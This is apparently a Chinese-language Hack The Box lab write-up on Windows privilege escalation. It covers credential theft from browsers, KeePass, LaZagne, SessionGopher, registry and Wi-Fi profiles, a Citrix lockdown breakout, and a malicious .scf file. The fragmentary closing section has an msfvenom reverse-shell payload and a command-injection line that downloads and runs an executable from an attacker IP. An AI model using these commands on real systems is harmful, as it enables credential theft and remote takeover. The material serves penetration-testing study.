U   af907b1b-1eef-4d29-b238-3ea74f7ffe5c
Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c
U   93b49900-6530-42e0-b35c-2663989ae4b3


&lt; SNIP &gt;

\id=011f29a4-e37f-451d-967e-c42b818473c2 vCenter
\id=34910533-ddcf-4ac4-b8ed-3d1f10be9e61 alright*
\id=ffaea2ff-b4fc-4a14-a431-998dc833208c root:Vc3nt3R_adm1n!ManagedPosition=Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c

&lt;SNIP &gt;</code></pre>
<p><strong>其他相关档案</strong> 我们可能还能在以下文件中找到凭证：</p>
<pre><code class="language-shellsession">%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*</code></pre>
<h3>进一步的凭证盗窃</h3>
<p>列出已保存的凭证 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey" rel="noreferrer" target="_blank">cmdkey</a> 命令可用于创建、列出和删除存储的用户名和密码。用户可能希望为特定主机存储凭证，或用于终端服务连接的凭证，以便通过远程桌面连接到远程主机，无需输入密码。这可能帮助我们横向迁移到拥有不同用户的系统，或者提升当前主机的权限，利用其他用户存储的凭证。</p>
<ol><li><strong>Cmdkey 已保存的凭据</strong></li></ol>
<pre><code>C:\htb&gt; cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob</code></pre>
<p>当我们尝试向主机进行 RDP 访问时，保存的凭证会被使用。</p>
<img alt="Pasted image 20260322055123" src="assets/posts/windows-privilege-escalation/Pasted image 20260322055123.png"/>
<p>我们也可以尝试用 <code>runas</code> 重用凭证，以该用户身份发送反向 shell，运行二进制文件，或用以下命令启动 PowerShell 或 CMD 控制台：</p>
<p>以其他用户身份执行命令</p>
<pre><code>PS C:\htb&gt; runas /savecred /user:inlanefreight\bob "COMMAND HERE"</code></pre>
<p>从 Chrome 中获取已保存的凭据 用户通常会在浏览器中存储他们经常访问的应用程序的凭证。我们可以使用像 <a href="https://github.com/GhostPack/SharpDPAPI" rel="noreferrer" target="_blank">SharpChrome</a> 这样的工具，从 Google Chrome 中获取 cookie 和保存的登录信息。</p>
<ol><li><strong>Browser Credentials  浏览器凭证</strong></li></ol>
<pre><code>PS C:\htb&gt; .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0


[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0


--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1</code></pre>
<p>注意：基于 Chromium 的浏览器收集凭证通常会产生额外事件，蓝队可以记录并识别，如 <code>4688</code>（进程创建）和 <code>16385</code>（DPAPI 活动）;防御者还可以考虑文件系统/对象访问事件，如 <code>4662</code>（对象访问）和 <code>4663</code>（文件访问），以提高检测精度。</p>
<p>许多公司为用户提供密码管理器。这可以是桌面应用程序如 <code>KeePass</code>，云端解决方案如 <code>1Password</code>，或企业密码库如 <code>Thycotic</code> 或 <code>CyberArk</code>。获取密码管理器的访问权限，尤其是 IT 人员或整个部门使用的密码管理器，可能导致管理员级别访问高价值目标，如网络设备、服务器、数据库等。我们可能通过密码重用或猜测弱密码/常见密码来访问密码库。一些密码管理器，如 <code>KeePass</code>，存储在主机本地。如果我们在服务器、工作站或文件共享中发现.<code>kdbx</code> 文件，就知道我们面对的是 <code>KeePass</code> 数据库，通常仅靠主密码保护。如果我们能向攻击主机下载 <code>.kdbx</code> 文件，可以使用 <a href="https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py" rel="noreferrer" target="_blank">keepass2john</a> 等工具提取密码哈希值，并通过密码破解工具如 <a href="https://github.com/hashcat" rel="noreferrer" target="_blank">Hashcat</a> 或 <a href="https://github.com/openwall/john" rel="noreferrer" target="_blank">John the Ripper</a> 进行处理。</p>
<ol><li><strong>Password Managers  密码管理器</strong></li></ol>
<p>提取 KeePass 哈希 首先，我们用 <code>keepass2john.py</code> 脚本提取 Hashcat 格式的哈希值。</p>
<pre><code>Chenduoduo@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154</code></pre>
<p>离线破解哈希 然后我们可以将哈希输入 Hashcat，KeePass 的哈希模式为 13400。如果成功，我们可能获得大量凭证，用于访问其他应用/系统，甚至网络设备、服务器、数据库等，前提是我们能访问 IT 人员使用的密码数据库。</p>
<pre><code>Chenduoduo@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) starting...

&lt;SNIP&gt;

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d...39c154
Time.Started.....: Fri Aug  6 11:17:47 2021 (22 secs)
Time.Estimated...: Fri Aug  6 11:18:09 2021 (0 secs)
Guess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      276 H/s (4.79ms) @ Accel:1024 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59984-60000
Candidates.#1....: 123456 -&gt; iheartyou

Started: Fri Aug  6 11:17:45 2021
Stopped: Fri Aug  6 11:18:11 2021</code></pre>
<p>如果我们访问了拥有 Microsoft Exchange 收件箱的域名用户的域名加入系统，可以使用 <a href="https://github.com/dafthack/MailSniper" rel="noreferrer" target="_blank">MailSniper</a> 工具尝试搜索用户邮箱中的“pass”、“creds”、“credentials”等词汇。</p>
<ol><li><strong>Email</strong></li></ol>
<p>当一切都失败时，我们可以运行 <a href="https://github.com/AlessandroZ/LaZagne" rel="noreferrer" target="_blank">LaZagne</a> 工具，尝试从各种软件中获取凭证。此类软件包括网页浏览器、聊天客户端、数据库、电子邮件、内存转储、各种系统管理工具以及内部密码存储机制（如 Autologon、Credman、DPAPI、LSA 秘密等）。该工具可用于运行所有模块、特定模块（如数据库），或针对特定软件（如 OpenVPN）。输出可以保存为标准文本文件或 JSON 格式。我们试试看吧。</p>
<ol><li>更多关于credentials</li></ol>
<p>我们可以查看带有 <code>-h</code> 标志的帮助菜单。</p>
<ul><li>查看 LaZagne 帮助菜单</li></ul>
<pre><code>PS C:\htb&gt; .\lazagne.exe -h

usage: lazagne.exe [-h] [-version]
                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                   ...
                   
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

positional arguments:
  {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                        Choose a main command
    chats               Run chats module
    mails               Run mails module
    all                 Run all modules
    git                 Run git module
    svn                 Run svn module
    windows             Run windows module
    wifi                Run wifi module
    maven               Run maven module
    sysadmin            Run sysadmin module
    browsers            Run browsers module
    games               Run games module
    multimedia          Run multimedia module
    memory              Run memory module
    databases           Run databases module
    php                 Run php module

optional arguments:
  -h, --help            show this help message and exit
  -version              laZagne version</code></pre>
<p>运行所有 LaZagne 模块 正如我们所见，我们有许多模块可供选择。运行<code>该工具</code>后，将搜索支持的应用程序并返回发现的明文凭据。正如下面的例子所示，许多应用程序并未安全存储凭证（最好永远不要存储凭证！）。它们可以轻松检索并用于本地升级权限、迁移到其他系统或访问敏感数据。</p>
<pre><code>PS C:\htb&gt; .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1

[+] 2 passwords have been found.

For more information launch it again with the -v option

elapsed time = 5.50499987602</code></pre>
<p>我们可以使用 <a href="https://github.com/Arvanaghi/SessionGopher" rel="noreferrer" target="_blank">SessionGopher</a> 提取保存的 PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP 凭证。该工具用 PowerShell 编写，能够搜索并解密存储的登录信息，用于远程访问工具。它可以本地运行，也可以远程运行。它会搜索 <code>HKEY_USERS</code> 蜂箱中所有登录过域加入（或独立）主机的用户，并搜索并解密任何保存的会话信息。它还可以用于搜索 PuTTY 私钥文件（.ppk）、远程桌面（.rdp）和 RSA（.sdtid）文件。</p>
<ol><li>进一步的credentials</li></ol>
<p>作为当前用户运行 SessionGopher 我们需要本地管理员权限来获取 <code>HKEY_USERS</code> 中每个用户存储的会话信息，但作为当前用户运行一下，看看是否能找到有用的凭据总是值得的。</p>
<pre><code>PS C:\htb&gt; Import-Module .\SessionGopher.ps1
 
PS C:\Tools&gt; Invoke-SessionGopher -Target WINLPE-SRV01
 
          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     \`m..m       Twitter: @arvanaghi | arvanaghi.com
 
[+] Digging on WINLPE-SRV01...
WinSCP Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :
 
 
PuTTY Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local
 

 
SuperPuTTY Sessions
 
 
Source        : WINLPE-SRV01\htb-student
SessionId     : NIX03
SessionName   : NIX03
Host          : nix03.inlanefreight.local
Username      : srvadmin
ExtraArgs     :
Port          : 22
Putty Session : Default Settings
</code></pre>
<p>某些程序和 Windows 配置可能导致注册表中存储明文密码或其他数据。虽然 <code>Lazagne</code> 和 <code>SessionGopher</code> 等工具是提取凭据的好方法，但作为渗透测试人员，我们也应熟悉并熟悉手动枚举凭证。</p>
<ol><li>注册表中的明文密码存储</li></ol>
<p>Windows <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon" rel="noreferrer" target="_blank">Autologon</a> 是一项功能，允许用户配置其 Windows 操操作系统自动登录特定用户账户，无需每次启动时手动输入用户名和密码。然而，一旦配置好，用户名和密码会以明文形式存储在注册表中。此功能通常用于单用户系统或在便利性大于安全性需求的情况下。</p>
<ul><li>Windows AutoLogon</li></ul>
<p>与 Autologon 相关的注册表密钥可在以下蜂箱的 <code>HKEY_LOCAL_MACHINE</code> 中找到，标准用户可以访问：</p>
<pre><code class="language-cmd">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon</code></pre>
<p>账户的典型配置涉及手动设置以下注册表密钥：</p>
<p><code>AdminAutoLogon</code>——判断 Autologon 是否被启用或禁用。值为“1”表示已启用。</p>
<p><code>DefaultUserName</code> - 保存将自动登录账户的用户名值。</p>
<p><code>DefaultPassword</code> - 保存之前指定用户账户密码的数值。</p>
<ul><li><code>AdminAutoLogon</code> - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.</li><li><code>DefaultUserName</code> - Holds the value of the username of the account that will automatically log on.</li><li><code>DefaultPassword</code> - Holds the value of the password for the user account specified previously.</li></ul>
<ul><li>用 reg.exe 枚举 Autologon</li></ul>
<pre><code>C:\htb&gt;reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    &lt;SNIP&gt;
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
</code></pre>
<p><strong><code>注意：</code></strong> 如果你非得为 Windows 系统配置 Autologon，建议使用 Sysinternals suite中的 Autologon.exe，它会将密码加密为 LSA 秘密。</p>
<p>对于使用代理连接的 Putty 会话，保存会话后，凭据以明文形式存储在注册表中。</p>
<ol><li><strong>Putty</strong></li></ol>
<pre><code>Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\&lt;SESSION NAME&gt;</code></pre>
<p>请注意，该注册表密钥的访问控制绑定在配置并保存会话的用户账户上。因此，要查看该账户，我们需要以该用户身份登录并搜索 <code>HKEY_CURRENT_USER</code> 蜂箱。随后，如果我们拥有管理员权限，就能在 <code>HKEY_USERS</code> 中对应用户的蜂巢中找到它。</p>
<p>首先，我们需要列举可用的保存会话：</p>
<ul><li>列举会议次数与查找资质：</li></ul>
<pre><code>PS C:\htb&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh</code></pre>
<p>接下来，我们查看发现的会话“<code>kali%20ssh</code>”的键和值：</p>
<pre><code>PS C:\htb&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  &lt;SNIP&gt;
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!</code></pre>
<p>在这个例子中，我们可以想象 IT 管理员为其环境中的用户配置了 Putty，但不幸地在代理连接中使用了管理员凭证。密码可以被提取，并可能在网络中重复使用。</p>
<ol><li>Wifi Passwords</li></ol>
<p>如果我们用无线网卡获得用户工作站的本地管理员权限，可以列出他们最近连接过的任何无线网络。</p>
<ul><li>查看已保存的无线网络</li></ul>
<pre><code>C:\htb&gt; netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    &lt;None&gt;

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp</code></pre>
<p>根据网络配置，我们可以获取预共享密钥（见下方<code>密钥</code>内容），并有可能访问目标网络。虽然罕见，但我们可能会在交战中遇到这种情况，并利用这些访问跳转到另一个无线网络，获得更多资源。</p>
<ul><li>获取已保存的无线密码</li></ul>
<pre><code>C:\htb&gt; netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default</code></pre>
<h2>Citrix 受限环境突破</h2>
<p>许多组织利用虚拟化平台，如终端服务、Citrix、AWS AppStream、CyberArk PSM 和自助终端，提供远程访问解决方案以满足其业务需求。然而，在大多数组织中，桌面环境会实施“锁定”措施，以最大限度地减少恶意员工和被入侵账户对整体域名安全的潜在影响。虽然这些桌面限制可能阻碍威胁行为者，但他们仍有可能“突破”受限环境。</p>
<p>Breakout基础方法：</p>
<p>进入<code>对话框</code> 。</p>
<p>利用对话框实现<code>命令执行</code> 。</p>
<p><code>升级权限</code>以获得更高级别的访问权限。</p>
<ol><li>Gain access to a <code>Dialog Box</code>.</li><li>Exploit the Dialog Box to achieve <code>command execution</code>.</li><li><code>Escalate privileges</code> to gain higher levels of access.</li></ol>
<p>在某些仅实施最低限度硬化的环境中，开始菜单甚至可能有一个标准快捷方式可以 <code>cmd.exe</code>，这可能会帮助未授权访问。然而，在高度限制的<code>封锁</code>环境中，任何试图在开始菜单中寻找“cmd.exe”或“PowerShell.exe”都不会有任何结果。同样，通过文件资源管理器访问 <code>C：\Windows\system32</code> 会触发错误，阻止直接访问关键系统工具。在如此受限的环境中获得“CMD/命令提示符”访问权限是一项显著成就，因为它提供了对操操作系统的广泛控制。这种控制层级使攻击者能够收集有价值的信息，促进权限的进一步升级。</p>
<p>有许多技术可以用来突破 Citrix 环境。本节不会涵盖所有可能的场景，但我们将介绍最常见的 Citrix 分组方法。</p>
<p>使用生成目标的 RDP 会话访问 <code>http://humongousretail.com/remote/</code> ，并使用下方提供的凭证登录。登录后，点击<code>默认桌面</code>获取 Citrix <code>launch.ica</code> 文件，以便连接到受限环境。</p>
<pre><code>Username: pmorgan
Password: Summer1Summer!
  Domain: htb.local
  
Import-Module C:\Users\pmorgan\Desktop\PowerUp.ps1  
Get-RegistryKeyValue -Key 'HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer' -ValueName 'AlwaysInstallElevated'  
Get-RegistryKeyValue -Key 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' -ValueName 'AlwaysInstallElevated'

</code></pre>
<h3>绕过路径限制</h3>
<p>当我们尝试使用文件资源管理器访问 <code>C：\Users</code> 时，发现它被限制，并出现错误。这表明组策略已被实施，限制用户使用文件资源管理器浏览 <code>C：\</code> 盘中的目录。在这种情况下，可以利用 Windows 对话框绕过组策略施加的限制。一旦获得 Windows 对话框，下一步通常是导航到包含本地可执行文件的文件夹路径，这些可执行文件提供交互式控制台访问（即：cmd.exe）。通常，我们可以直接在文件名字段输入文件夹路径，从而访问该文件。</p>
<img alt="Pasted image 20260322063450" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063450.png"/>
<p>通过 Citrix 部署的众多桌面应用程序都具备与操操作系统文件交互的功能。诸如保存、另存为、打开、加载、浏览、导入、导出、帮助、搜索、扫描和打印等功能，通常为攻击者提供调用 Windows 对话框的机会。在 Windows 中，使用绘画、记事本、文字板等工具打开对话框有多种方式。本节我们将以 <code>MS Paint</code> 为例。</p>
<p>从开始菜单运行<code>绘画</code> ，点击 <code>“文件 &gt; 打开</code> ”以打开对话框。</p>
<img alt="Pasted image 20260322063517" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063517.png"/>
<p>打开 Windows 绘制对话框后，我们可以在文件名字段下输入 <a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths" rel="noreferrer" target="_blank">UNC</a> 路径 <code>\\127.0.0.1\c$\users\pmorgan</code>，并将 File-Type 设置为<code>所有文件</code> ，按下回车后即可访问所需的目录。</p>
<h3>从受限环境中访问 SMB 共享</h3>
<p>由于设置了限制，文件资源管理器不允许直接访问攻击者机器上的 SMB 共享，也不能访问托管 Citrix 环境的 Ubuntu 服务器。不过，通过在 Windows 对话框中使用 UNC 路径，可以绕过这一限制。这种方法可用于促进从另一台计算机传输文件。</p>
<p>用 Impacket的 <code>smbserver.py</code> 脚本从 Ubuntu 机器启动 SMB 服务器。</p>
<pre><code>root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed</code></pre>
<p>回到 Citrix 环境，通过开始菜单启动“绘图”应用。进入“文件”菜单，选择“打开”，提示对话框出现。在这个与 Paint 相关的 Windows 对话框中，输入 UNC 路径为 <code>\\10.13.38.95\share</code>，输入指定的“文件名”字段。确保文件类型参数设置为“所有文件”。按下“回车”键即可进入该股份。</p>
<p>由于文件资源管理器内部存在限制，直接复制文件不可行。不过，另一种方法是右<code>键点击</code>可执行文件，然后启动它们。右键点击 <code>pwn.exe</code> 二进制文件并选择 <code>“打开</code> ”，这应该会提示我们运行它，并会打开一个命令控制台。</p>
<img alt="Pasted image 20260322063739" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063739.png"/>
<p>可执行 <code>pwn.exe</code> 是从 <code>pwn.c</code> 文件编译的自定义二进制文件，执行时会打开 cmd。</p>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}</code></pre>
<p>然后我们可以利用获得的 cmd 权限，将文件从 SMB 共享复制到 pmorgan 的桌面目录。</p>
<img alt="Pasted image 20260322063831" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063831.png"/>
<h3>Explorer 的替代方案</h3>
<p>在对文件资源管理器施加严格限制的情况下，可以使用像 <code>Q-Dir</code> 或 <code>Explorer++</code> 这样的替代文件系统编辑器作为变通方法。这些工具可以绕过组策略强制执行的文件夹限制，使用户能够浏览和访问在标准文件资源管理器环境中本应受限的文件和目录。</p>
<p>值得注意的是，之前文件资源管理器无法从 SMB 共享复制文件，原因是存在一些限制。然而，通过利用 <code>Explorer++</code>，以下截图已成功演示了将文件从 <code>\\13.38.95\share</code> 位置复制到属于用户 <code>pmorgan</code> 的桌面的功能。</p>
<img alt="Pasted image 20260322063901" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063901.png"/>
<p>由于其速度快、用户友好的界面和便携性，<a href="https://explorerplusplus.com/" rel="noreferrer" target="_blank">Explorer++</a> 被强烈推荐并经常用于此类场合。作为一个可移植应用程序，它可以直接执行而无需安装，因此是绕过组策略设置的文件夹限制的便捷选择。</p>
<h3>备用注册编辑</h3>
<img alt="Pasted image 20260322063935" src="assets/posts/windows-privilege-escalation/Pasted image 20260322063935.png"/>
<p>同样，当默认注册表编辑器被组策略阻挡时，可以使用替代的注册表编辑器来绕过标准组策略的限制。<a href="https://sourceforge.net/projects/simpregedit/" rel="noreferrer" target="_blank">Simpleregedit</a>、<a href="https://sourceforge.net/projects/uberregedit/" rel="noreferrer" target="_blank">Uberregedit</a> 和 <a href="https://sourceforge.net/projects/sre/" rel="noreferrer" target="_blank">SmallRegistryEditor</a> 是此类 GUI 工具的例子，它们便于编辑 Windows 注册表而不受组策略阻断的影响。这些工具为管理注册表设置提供了实用且有效的解决方案，适用于此类受限环境。</p>
<h3>修改现有快捷指令文件</h3>
<p>通过修改现有的 Windows 快捷方式并在<code>目标</code>字段设置所需可执行程序的路径，也可以实现对文件夹路径的未授权访问。</p>
<p>以下步骤概述了整个流程：</p>
<p><code>右键点击</code>想要的快捷方式。</p>
<p>选择<code>属性</code> 。</p>
<ol><li><code>Right-click</code> the desired shortcut.</li><li>Select <code>Properties</code>.</li></ol>
<img alt="Pasted image 20260322064024" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064024.png"/>
<p>Within the <code>Target</code> field, modify the path to the intended folder for access. 在<code>目标</code>字段中，修改访问目标文件夹的路径。</p>
<img alt="Pasted image 20260322064042" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064042.png"/>
<p>执行快捷指令，命令键就会生成</p>
<ol><li>Execute the Shortcut and cmd will be spawned</li></ol>
<img alt="Pasted image 20260322064055" src="assets/posts/windows-privilege-escalation/Pasted image 20260322064055.png"/>
<p>如果现有快捷键文件不可用，还有其他方法可以考虑。一种选择是通过 SMB 服务器传输已有的快捷方式文件。或者，我们可以按照 <code>Generating a Malicious .lnk File</code> 标签页下“ 与用户互动”部分提到的，使用 PowerShell 创建一个新的快捷方式文件。这些方法在使用快捷键文件时实现目标提供了灵活性。</p>
<pre><code>xfreerdp /v:10.129.205.244 /u:htb-student /p:HTB_@cademy_stdnt!</code></pre>
<h2>补充技巧</h2>
<h3>与用户进行交互</h3>
<p>用户有时是组织中最薄弱的一环。一个超载的员工在快速工作时，可能在浏览共享硬盘、点击链接或运行文件时，注意到机器上有“异常”。正如本模块中所讨论的，Windows 给我们带来了巨大的攻击面，在枚举本地权限升级向量时需要检查许多事项。当我们用尽所有方法后，可以考虑具体手段，通过监听用户的网络流量/本地命令，或攻击需要用户互动的已知易受攻击服务来窃取凭证。我最喜欢的技巧之一是将恶意文件放置在访问频繁的文件共享周围，试图获取用户密码哈希值，以便以后离线破解。</p>
<h4>流量捕获</h4>
<p>如果安装<code>Wireshark</code>，非特权用户可能能够捕获网络流量，因为默认情况下不启用仅限管理员访问 Npcap 驱动的选项。</p>
<img alt="Pasted image 20260322164838" src="assets/posts/windows-privilege-escalation/Pasted image 20260322164838.png"/>
<p>这里我们可以看到一个粗略示例，如何捕获其他用户在同一输入框时输入的明文 FTP 凭证。虽然可能性不大，但如果 <code>Wireshark</code> 安装在我们降落的设备上，值得尝试流量捕获，看看能捕捉到什么。</p>
<img alt="Pasted image 20260322164844" src="assets/posts/windows-privilege-escalation/Pasted image 20260322164844.png"/>
<p>另外，假设我们的客户将我们置于环境中的攻击机器上。在这种情况下，值得先运行 <code>tcpdump</code> 或 <code>Wireshark</code> 一段时间，看看有哪些类型的流量通过线路传输，以及是否能发现什么有趣的情况。工具网络信用记录可以从我们的攻击设备运行，从实时界面或 pcap 文件中检测密码和哈希值。值得在评估时让该工具在后台运行，或者用 pcap 测试，看看能否提取对权限升级或横向转移有用的凭证。</p>
<h4>进程命令行审计</h4>
<p>进程命令行</p>
<p><strong>进程命令行监控</strong></p>
<p>作为用户获得 shell 时，可能会有计划任务或其他进程在命令行传递凭证。我们可以用下面这个脚本来查找进程命令行。它每两秒捕获进程命令行，并将当前状态与之前的状态进行比较，输出任何差异。</p>
<pre><code>while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}</code></pre>
<p><strong>在目标主机上运行监控脚本</strong> 我们可以将脚本托管在攻击机器上，并在目标主机上执行，具体如下。</p>
<pre><code>[Shell]
Command=2
IconFile=\\10.10.15.137\share\test.ico
[Taskbar]
Command=ToggleDesktop</code></pre>
<h3>信息搜刮</h3>
<pre><code>python3 mremoteng_decrypt.py -s "s1lN9UQqWy2QFv2aKVGFa2YRfFvpObytu04vyCuVQi12M0kyV3Xc0xwAlTz0aSNRiR3Rilf6Xb4XQ="

</code></pre>
<h3>其他技巧</h3>
<h2>技能评估</h2>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.137 LPORT=9919 -f exe -o payload.exe  
  
python3 -m http.server


set lhost 10.10.15.137

127.0.0.1 &amp; PowerShell -c “Invoke-WebRequest -Uri [http://10.10.15.137:8000/payload.exe](http://10.10.15.137/payload.exe) -OutFile C:\Windows\Temp\payload.exe; Start-Process C:\Windows\Temp\payload.exe”


